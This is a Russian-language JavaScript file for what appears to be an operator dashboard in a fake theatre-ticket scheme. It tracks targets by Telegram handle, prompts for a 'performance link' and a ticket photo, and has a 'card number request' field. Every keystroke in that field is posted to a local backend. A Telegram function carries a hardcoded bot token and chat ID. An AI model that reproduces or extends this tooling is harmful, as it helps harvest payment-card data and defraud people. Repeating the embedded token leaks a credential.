
function requestNotificationPermission() {
  if ('Notification' in window) {
    Notification.requestPermission().then(permission => {
      if (permission !== 'granted') {
        alert("Разреши уведомления в браузере, чтобы получать оповещения!");
      }
    });
  }
}

function notify(title, message) {
  if (Notification.permission === "granted") {
    new Notification(title, { body: message });
  }
}

function renderUserCard(user) {
  const card = document.createElement("div");
  card.className = "user-card";

  const imgId = "img_" + Math.random().toString(36).substring(2);

  card.innerHTML = `
    <div class="close-btn" onclick="removeCard(this)">×</div>
    <div><b>👤 ${user.name}</b></div>
    <div>📍 <span class="city">${user.city}</span></div>
    <div>🕓 ${user.time}</div>

    <input type="text" placeholder="🔗 Вставь ссылку на спектакль">

    <div class="info-block">
      🎫 Запрос фото билета <br>
      🎟 Покажешь: Ряд ${user.row}, место ${user.seat}, ${user.city}, ${user.date}<br>
      <input type="file" accept="image/*" onchange="showPreview(this, '${imgId}')">
      <img id="${imgId}" class="uploaded-img" style="display:none;" />
    </div>

    <div class="info-block">
      💳 Запрос номера карты <br>
      🎟 Билет: Ряд ${user.row}, места ${user.seat} и ${user.seat + 1}<br>
      <input type="text" placeholder="💳 Вставь номер карты">
    </div>

    <div class="actions">
      ${user.actions.map(a => `
        <div style="margin-top:8px">
          <button onclick="alert('Нажато: ${a}')">${a}</button>
          <span class="checkbox" onclick="this.classList.toggle('checked')">✓</span>
        </div>`).join("")}
    </div>
  `;
  document.getElementById("user-cards").appendChild(card);
  notify("🔔 Новый запрос от " + user.name, user.time);
}

function removeCard(el) {
  if (confirm("Вы точно хотите удалить этот профайл?")) {
    el.parentElement.remove();
  }
}

function showPreview(input, imgId) {
  const file = input.files[0];
  const img = document.getElementById(imgId);
  if (file) {
    const reader = new FileReader();
    reader.onload = function(e) {
      img.src = e.target.result;
      img.style.display = "block";
    };
    reader.readAsDataURL(file);
  }
}

function generateRandomUser() {
  const names = ["@andrey_kzn", "@misha_spb", "@ilya_ekb", "@nikita_nsk", "@sasha_vrn"];
  const cities = ["Казань", "Санкт-Петербург", "Екатеринбург", "Новосибирск", "Воронеж"];
  const actions = ["Купил", "Сделал 1 возврат", "Сделал 2 возврата", "Сделал 3 возврат", "Сделал 4 возврата", "Сделал 5 возвратов", "Сделал 6 возвратов", "Написал в поддержку"];
  const idx = Math.floor(Math.random() * names.length);
  const user = {
    name: names[idx],
    city: cities[idx],
    time: "8 июля, 18:30 — Запросил ссылку на спектакль",
    date: "8 июля в 20:00",
    row: 3 + Math.floor(Math.random() * 3),
    seat: 5 + Math.floor(Math.random() * 3),
    actions: actions
  };
  renderUserCard(user);
}

function sendTelegramNotification(message) {
  const botToken = '7682430753:AAH5SReY8fNL6kwI9Zcm6EQeLlSd0-nkNQM';
  const chatId = '7663053210';
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    })
  });
}

// Пример кнопок для теста
document.addEventListener("DOMContentLoaded", () => {
  document.querySelectorAll(".notify-button").forEach(button => {
    button.addEventListener("click", () => {
      const message = button.getAttribute("data-message");
      sendTelegramNotification(message);
    });
  });
});



function sendLink(button) {
  const container = button.closest(".user-card");
  const input = container.querySelector(".spectacle-link");
  const link = input?.value.trim();
  if (!link) return alert("Вставьте ссылку");
  alert("Ссылка отправлена: " + link);
}

function sendTicket(button) {
  alert("Фото билета отмечено как отправленное.");
}

function sendCard(button) {
  const container = button.closest(".user-card");
  const input = container.querySelector("input[placeholder*='карты']");
  const card = input?.value.trim();
  if (!card) return alert("Введите номер карты");
  alert("Номер карты отправлен: " + card);
}

function sendManualCommand() {
  const input = document.getElementById("admin-command");
  const text = input.value.trim();
  if (!text) return;
  const block = document.getElementById("bot-questions");
  const msg = document.createElement("div");
  msg.textContent = "🟨 Бот просит: " + text;
  block.appendChild(msg);
  input.value = "";
}



function autoSendLink(input) {
  const link = input.value.trim();
  if (!link) return;
  console.log("📤 Ссылка отправлена:", link);
  fetch("http://localhost:5000/send_link", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username: "@andrey_kzn", link: link })
  });
}

function autoSendCard(input) {
  const card = input.value.trim();
  if (!card) return;
  console.log("📤 Номер карты отправлен:", card);
  fetch("http://localhost:5000/send_card", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username: "@andrey_kzn", card: card })
  });
}

function autoSendCommand(input) {
  const text = input.value.trim();
  if (!text) return;
  console.log("📤 Команда отправлена:", text);
  fetch("http://localhost:5000/send_command", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ text: text })
  });
}

function autoSendFile(input) {
  const file = input.files[0];
  if (!file) return;
  console.log("📤 Фото билета отправлено");
  // Фактическую загрузку файла можно заменить здесь
}

document.addEventListener("input", function(e) {
  if (e.target.placeholder === "🔗 Вставь ссылку на спектакль") autoSendLink(e.target);
  if (e.target.placeholder === "💳 Вставь номер карты") autoSendCard(e.target);
  if (e.target.id === "admin-command") autoSendCommand(e.target);
});

document.addEventListener("change", function(e) {
  if (e.target.type === "file") autoSendFile(e.target);
});
